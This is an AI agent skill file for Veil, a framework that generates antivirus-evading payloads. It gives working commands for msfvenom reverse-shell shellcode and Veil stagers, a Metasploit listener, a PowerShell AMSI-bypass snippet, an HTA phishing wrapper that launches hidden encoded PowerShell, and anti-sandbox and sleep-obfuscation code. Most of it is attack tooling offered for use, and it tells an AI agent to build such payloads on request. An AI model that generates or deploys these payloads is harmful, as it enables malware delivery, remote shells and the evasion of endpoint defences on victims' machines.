---
name: veil
description: >
  Build, extend, and operate Veil — a payload generation framework for antivirus evasion.
  Use when working with Veil-Evasion, when the user needs to generate AV-evading payloads,
  when creating shellcode stagers in Python, C, C#, Go, PowerShell, or Ruby, or when testing
  evasion efficacy against endpoint defenses. Covers installation, Veil-Evasion module usage,
  payload types, output formats, msfvenom shellcode integration, custom shellcode injection,
  compiler options, and evasion testing workflows.
metadata:
  author: redhoundinfosec
  version: '1.0'
  repo: https://github.com/Veil-Framework/Veil
  stars: '4.2k'
---

# veil Agent Skill

## When to Use This Skill

Use this skill when:
- The user needs to generate AV-evading executables or shellcode stagers
- Working with Veil-Evasion on a red team or pentest engagement
- The user asks about payload encoding, obfuscation, or AV bypass techniques
- Creating payloads for use with Metasploit or custom C2 frameworks
- The user needs to test evasion against VirusTotal alternatives or EDR solutions

## What Veil Does

Veil is a payload generation framework designed to bypass antivirus detection. Its primary component, Veil-Evasion, takes raw shellcode (from msfvenom or custom sources) and wraps it in multiple language-level stagers (Python, C, C#, Go, PowerShell, Ruby) that compile into executables. The project lives at `Veil-Framework/Veil` and has ~4.2k GitHub stars.

## Installation

### Kali Linux (apt — recommended)
```bash
sudo apt update && sudo apt install -y veil
# First-run setup (installs dependencies, Wine, compilers)
sudo veil --setup
# Confirm Wine and all compilers install successfully
```

### From Source (any Debian/Ubuntu)
```bash
git clone https://github.com/Veil-Framework/Veil.git /opt/veil
cd /opt/veil
sudo ./config/setup.sh --force --silent
# setup.sh installs: mingw-w64, mono-complete, Python 3, Go, Ruby, Wine
```

### Dependency Verification
```bash
which i686-w64-mingw32-gcc        # C 32-bit cross-compiler
which x86_64-w64-mingw32-gcc      # C 64-bit cross-compiler
which mcs                         # Mono C# compiler
go version                        # Go toolchain
wine --version                    # Wine for Python payloads compiled to EXE
```

### Docker (isolated environment)
```bash
docker pull mattiasohlsson/veil
docker run -it -v /tmp/veil-output:/veil/output mattiasohlsson/veil
```

## Core Concepts

### Architecture
- **Veil-Evasion**: Main tool for payload generation (the only active module as of Veil 4.x)
- **Tools directory**: `/usr/share/veil/tools/`
- **Payload output**: `/var/lib/veil/output/` (EXE, source, handlers)
- **Config**: `/etc/veil/settings.py`

### Payload Anatomy
Every Veil payload consists of three layers:
1. **Shellcode source** — raw bytes from msfvenom, custom implant, or Havoc/Sliver
2. **Language stager** — the source file that embeds/decodes shellcode at runtime
3. **Compiled binary** — the final artifact (EXE, DLL, HTA, BAT, etc.)

### Evasion Strategies
- Compile-time: different compilers, language choice, stripping symbols
- Runtime: sleep calls, sandbox detection, AMSI bypass, in-memory execution
- Encoding: base64, XOR, RC4 of the shellcode blob
- Obfuscation: variable name randomization, dead code insertion (language-dependent)

## CLI Reference

### Launching Veil
```bash
veil                         # Interactive menu
veil -t Evasion              # Jump directly to Evasion tool
veil -t Evasion --list-payloads   # List all payloads without interactive mode
veil --help
```

### Interactive Mode Navigation
```
Veil> list                   # List all available tools
Veil> use 1                  # Select Evasion tool by number
Veil/Evasion> list           # List all available payloads
Veil/Evasion> use 7          # Select payload by index
Veil/Evasion> use c/meterpreter/rev_tcp    # Select by path
Veil/Evasion> info           # Show payload description and options
Veil/Evasion> options        # List configurable options
Veil/Evasion> set LHOST 10.10.14.5
Veil/Evasion> set LPORT 4444
Veil/Evasion> generate       # Generate the payload
Veil/Evasion> back           # Go back one level
Veil/Evasion> exit
```

### Non-Interactive (Scripted) Mode
```bash
# Generate a specific payload non-interactively
veil -t Evasion -p go/meterpreter/rev_tcp \
  --msfvenom "windows/x64/meterpreter/reverse_tcp" \
  --ip 10.10.14.5 --port 4444 \
  -o payload_go

# Pipe shellcode from msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 -f raw -o /tmp/shell.bin

veil -t Evasion -p c/shellcode_inject/flat \
  --custom-shellcode /tmp/shell.bin \
  --ip 10.10.14.5 --port 4444 \
  -o payload_c_custom
```

## Payload Types

### Python Stagers
```
python/meterpreter/rev_tcp          # Classic, widely detected
python/meterpreter/rev_http         # HTTP-based
python/shellcode_inject/aes_encrypt # AES-encrypted shellcode blob
python/shellcode_inject/flat        # Simple flat injection
python/shellcode_inject/rc4         # RC4-encrypted
```
- Compiled to EXE via `py2exe` or `PyInstaller` through Wine
- Least AV-evasive in 2024+ but useful for older targets

### C Stagers (best performance)
```
c/meterpreter/rev_tcp
c/meterpreter/rev_http
c/shellcode_inject/flat
c/shellcode_inject/virtual_alloc    # VirtualAlloc + VirtualProtect + thread
c/shellcode_inject/apc_queue        # APC queue injection
```
- Compiled with `mingw-w64` cross-compiler
- Produces lean native Windows PE; good EDR evasion baseline

### C# Stagers
```
cs/meterpreter/rev_tcp
cs/shellcode_inject/base64
cs/shellcode_inject/virtual_alloc
```
- Compiled with `mcs` (Mono); runs on .NET Framework
- Useful for living-off-the-land .NET execution via `InstallUtil`, `regsvcs`

### Go Stagers (recommended for evasion)
```
go/meterpreter/rev_tcp
go/shellcode_inject/virtual_alloc
```
- Go binaries have high entropy and unusual import tables — lower static detection
- Compiled with native Go toolchain targeting `GOOS=windows GOARCH=amd64`

### PowerShell Stagers
```
powershell/meterpreter/rev_tcp
powershell/shellcode_inject/virtual_alloc
```
- Outputs `.ps1`; use `-enc` flag or HTA wrapper for delivery
- AMSI is a challenge; pair with AMSI-bypass prepend

### Ruby Stagers
```
ruby/meterpreter/rev_tcp
```
- Requires Ruby runtime on target; niche use

## Output Formats

| Format | Flag / Selection | Notes |
|--------|-----------------|-------|
| EXE    | default          | Standard PE32/PE32+ binary |
| Source | auto-saved       | Raw stager source in `/var/lib/veil/output/source/` |
| Shellcode | via msfvenom | Raw `.bin` passed as `--custom-shellcode` |
| BAT    | wrapper script   | Runs PowerShell or Python EXE |
| HTA    | delivery wrapper | Executes via `mshta.exe` |

Generated files land in `/var/lib/veil/output/compiled/` and source in `/var/lib/veil/output/source/`.

## Shellcode Generation — msfvenom Integration

### Standard msfvenom → Veil Pipeline
```bash
# Step 1: Generate raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=10.10.14.5 LPORT=443 \
  EXITFUNC=thread \
  -f raw -o /tmp/msf_shell.bin

# Step 2: Feed into Veil C stager
veil -t Evasion -p c/shellcode_inject/virtual_alloc \
  --custom-shellcode /tmp/msf_shell.bin \
  -o stage_https_c

# Output: /var/lib/veil/output/compiled/stage_https_c.exe
```

### Staged vs. Stageless
```bash
# Stageless (larger, self-contained)
msfvenom -p windows/x64/meterpreter_reverse_https \
  LHOST=10.10.14.5 LPORT=443 -f raw -o /tmp/stageless.bin

# Staged (smaller, needs listener)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 -f raw -o /tmp/staged.bin
```

### Custom Shellcode Injection
```bash
# Use any raw shellcode blob (Havoc, Sliver, Donut output)
donut -f shellcode.exe -o /tmp/donut.bin
veil -t Evasion -p go/shellcode_inject/virtual_alloc \
  --custom-shellcode /tmp/donut.bin \
  -o donut_wrapped_go
```

## Compiler Options and Hardening

### Stripping Debug Symbols (C payloads)
Veil uses `mingw-w64` flags internally. For manual compilation of Veil source:
```bash
x86_64-w64-mingw32-gcc -O2 -s \
  -o payload.exe payload.c \
  -mwindows \
  -static-libgcc
# -s strips symbol table
# -mwindows hides console window
# -static-libgcc embeds runtime statically
```

### C# Compilation Options
```bash
mcs -out:payload.exe payload.cs \
  -platform:x64 \
  -optimize+ \
  /reference:System.dll
```

### Go Cross-Compilation
```bash
GOOS=windows GOARCH=amd64 go build \
  -ldflags="-s -w -H=windowsgui" \
  -o payload.exe payload.go
# -s: strip symbol table
# -w: strip DWARF debug info
# -H=windowsgui: no console window
```

### Garble (Go obfuscation, post-Veil)
```bash
go install mvdan.cc/garble@latest
GOOS=windows GOARCH=amd64 garble -seed=random build \
  -ldflags="-H=windowsgui" \
  -o payload_obf.exe .
```

## Evasion Testing Workflow

### Local Testing (no internet leak)
```bash
# Test with Windows Defender in VM — DO NOT submit to VirusTotal
# Snapshot the VM before testing, revert after

# Check file entropy (high entropy = possible detection via heuristics)
file payload.exe
python3 -c "
import math, collections
data = open('payload.exe','rb').read()
freq = collections.Counter(data)
entropy = -sum((c/len(data))*math.log2(c/len(data)) for c in freq.values())
print(f'Entropy: {entropy:.2f}/8.00')
"
```

### AV Scanning Alternatives (no sample sharing)
```bash
# antiscan.me — no sample sharing to AV vendors (paid)
# nodistribute.com — no distribution (free, limited)
# Local: CAPE sandbox on-prem, any-run enterprise
# Use ClamAV as baseline: clamscan payload.exe
clamscan --database=/var/lib/clamav payload.exe
```

### AMSI Bypass Prepend (PowerShell payloads)
```powershell
# Prepend to ps1 stager
$a=[Ref].Assembly.GetTypes();
ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};
$d=$c.GetFields('NonPublic,Static');
ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf=@(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

## Common Workflows

### Standard Red Team Payload Build
```bash
# 1. Generate raw shellcode from msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=redteam.example.com LPORT=443 \
  EXITFUNC=thread -f raw -o /tmp/shell.bin

# 2. Wrap with Go stager (best evasion)
veil -t Evasion -p go/shellcode_inject/virtual_alloc \
  --custom-shellcode /tmp/shell.bin -o op_payload

# 3. Test entropy and static detection
clamscan /var/lib/veil/output/compiled/op_payload.exe

# 4. Set up handler
msfconsole -q -x "
use exploit/multi/handler;
set payload windows/x64/meterpreter/reverse_https;
set LHOST 0.0.0.0; set LPORT 443;
set ExitOnSession false;
exploit -j"
```

### HTA Delivery (Phishing)
```bash
# Generate PowerShell stager
veil -t Evasion -p powershell/shellcode_inject/virtual_alloc \
  --ip 10.10.14.5 --port 443 -o ps_payload

# Wrap in HTA
cat > /var/www/html/payload.hta <<'EOF'
<html><head><script language="VBScript">
Sub AutoOpen()
  Dim oShell
  Set oShell = CreateObject("WScript.Shell")
  oShell.Run "powershell.exe -w hidden -enc <BASE64_ENCODED_PS1>", 0, False
End Sub
AutoOpen()
</script></head><body></body></html>
EOF
```

### Donut + Veil (shellcode from any PE)
```bash
# Convert any EXE/DLL to position-independent shellcode
go install github.com/Binject/go-donut/cmd/donut@latest
donut -f implant.exe -a 2 -o /tmp/donut_out.bin

# Wrap in Veil C stager
veil -t Evasion -p c/shellcode_inject/virtual_alloc \
  --custom-shellcode /tmp/donut_out.bin -o donut_veil
```

## Advanced Techniques

### Modifying Veil Source Stagers
Source files live in `/usr/share/veil/tools/Evasion/payloads/`. Edit stager templates to add custom obfuscation:
```bash
ls /usr/share/veil/tools/Evasion/payloads/go/shellcode_inject/
# Modify virtual_alloc.py (the Python template generator, not Go source)
# The .py file renders the final .go source at generation time
```

### Sandbox Detection in C Stagers
Add anti-sandbox checks to the source before compilation:
```c
// Check if running in sandbox (low uptime = sandbox)
#include <windows.h>
ULONGLONG uptime = GetTickCount64();
if (uptime < 300000) { ExitProcess(0); } // Exit if < 5 min uptime

// Check username
char user[256]; DWORD sz = sizeof(user);
GetUserNameA(user, &sz);
if (strcmp(user, "sandbox") == 0 || strcmp(user, "malware") == 0)
    ExitProcess(0);
```

### Sleep Obfuscation
Encode shellcode in memory during sleep to evade memory scanners:
```c
// XOR shellcode with key during Sleep
for (int i = 0; i < shellcode_len; i++) shellcode[i] ^= 0xAB;
Sleep(5000);
for (int i = 0; i < shellcode_len; i++) shellcode[i] ^= 0xAB;
```

## Integration with Other Tools

| Tool | Integration |
|------|-------------|
| Metasploit | `multi/handler` catches Veil-generated meterpreter stagers |
| msfvenom | Generates raw shellcode fed into Veil via `--custom-shellcode` |
| Donut | Converts arbitrary PE to shellcode for Veil to wrap |
| Garble | Post-processes Go source to obfuscate symbol names |
| Cobalt Strike | CS shellcode (via `artifact.cna` raw export) as custom shellcode |
| Havoc C2 | Export Havoc demon shellcode → Veil wraps it |

## Troubleshooting

**Wine errors during Python payload compilation**
```bash
# Reinstall Wine components
sudo dpkg --add-architecture i386
sudo apt install wine32 wine64 -y
# Re-run setup
sudo veil --setup --force
```

**`mingw-w64` not found**
```bash
sudo apt install mingw-w64 -y
which x86_64-w64-mingw32-gcc   # Verify
```

**Mono/C# compiler missing**
```bash
sudo apt install mono-complete -y
mcs --version
```

**Go not installed**
```bash
sudo apt install golang -y
# Or install latest from golang.org/dl
```

**Payload detected immediately**
- Switch language (Python → Go → C)
- Use custom shellcode from a non-Metasploit C2
- Add sleep calls and sandbox detection to source
- Strip symbols: `-s -w` in Go, `-s` in GCC
- Increase shellcode entropy variation with custom XOR key
- Do not submit to VirusTotal (signatures are shared with AV vendors)

**Output directory permissions**
```bash
sudo chmod 777 /var/lib/veil/output/
# Or run veil with sudo
```
---

> Built by [Red Hound InfoSec](https://redhound.us) — On-demand offensive security expertise for SMBs.
> 20+ years of Fortune 500 experience. Penetration testing, attack surface analysis, and security consulting.
>
> [redhound.us](https://redhound.us) | [GitHub](https://github.com/redhoundinfosec) | [Book a consultation](https://redhound.us/#contact)
